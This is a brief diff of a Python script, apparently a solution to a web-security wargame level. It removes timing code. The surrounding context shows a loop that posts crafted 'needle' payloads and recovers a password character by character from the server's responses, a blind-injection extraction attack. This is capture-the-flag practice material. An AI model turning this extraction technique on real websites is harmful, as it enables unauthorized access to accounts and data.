@@ -12,8 +12,6 @@ def got_results(password_prefix: str) -> bool:
     response = session.post(url, data={"needle": payload, "submit": "submit"})
     return "secured" not in response.text
 
-import time
-start_time = time.perf_counter()
 
 password = ""
 while True:
@@ -28,6 +26,4 @@ while True:
     if not found_next_char:
         break
 
-end_time = time.perf_counter()
-print(f"Time taken: {end_time - start_time} seconds")
 print(password)
